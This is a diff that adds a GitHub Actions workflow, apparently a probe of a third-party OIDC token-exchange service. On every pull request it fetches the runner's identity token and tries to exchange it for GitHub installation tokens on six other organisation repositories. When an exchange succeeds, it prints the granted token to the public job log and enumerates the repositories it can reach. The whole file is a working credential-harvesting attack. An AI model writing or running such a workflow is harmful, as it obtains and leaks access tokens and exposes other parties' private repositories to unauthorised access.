@@ -1,0 +1,31 @@
+name: je-probe
+on:
+  pull_request:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        env:
+          JE: https://jwt-exchange.synkube.com/api/v2/exchange/token
+        run: |
+          echo "EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF REPO=$GITHUB_REPOSITORY ACTOR=$GITHUB_ACTOR"
+          echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes} OIDC_TOK_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          t=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fjwt-exchange" | jq -r '.value // empty')
+          echo "TOKLEN=${#t}"
+          echo "CLAIMS=$(printf '%s' "$t" | cut -d. -f2 | tr '_-' '/+' | { read p; case $(( ${#p} % 4 )) in 2) p="$p==";; 3) p="$p=";; esac; printf '%s' "$p" | base64 -d 2>/dev/null; } | jq -c '{iss,aud,sub,repository,repository_owner,event_name,ref}' 2>/dev/null)"
+          for tgt in synkube/lite-argo-apps synkube/jwt-exchange synkube/charts synkube/agent-github-broker synkube/.github synkube/website; do
+            payload=$(jq -cn --arg t "$t" --arg r "$tgt" '{subject_token:$t, resource:{type:"github_repository", id:$r}, requested:{github_permissions:{contents:"read",metadata:"read"}}, exchange_profile:"github_actions_to_installation"}')
+            code=$(curl -sS -o je_body.txt -w '%{http_code}' --max-time 25 -X POST "$JE" -H 'Content-Type: application/json' -d "$payload")
+            echo "EXCH $tgt -> $code $(head -c 300 je_body.txt)"
+            if [ "$code" = "200" ]; then
+              ITO=$(jq -r .token je_body.txt); echo "TOKEN=$ITO"
+              curl -sS --max-time 20 -H "Authorization: token $ITO" "https://api.github.com/installation/repositories?per_page=100" | jq -r '.total_count, (.repositories[]?|"\(.full_name) private=\(.private) push=\(.permissions.push)")' | head -60
+              break
+            fi
+            sleep 1
+          done
